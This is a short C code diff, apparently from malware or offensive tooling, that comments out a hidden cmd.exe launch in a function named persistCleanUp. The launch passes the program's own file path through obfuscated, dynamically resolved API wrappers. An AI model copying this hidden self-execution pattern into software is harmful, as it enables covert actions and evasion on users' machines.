@@ -205,5 +205,5 @@ void persistCleanUp() {
 	TempGetModuleFileNameA1(NULL, fileNameBuffer, 260);
 
 	sprintf(commandBuffer, (LPCSTR)command_str, fileNameBuffer);
-	TempShellExecuteA1(0, (LPCSTR)open_str, (LPCSTR)cmd_exe_str, commandBuffer, 0, SW_HIDE);
+	//TempShellExecuteA1(0, (LPCSTR)open_str, (LPCSTR)cmd_exe_str, commandBuffer, 0, SW_HIDE);
 }
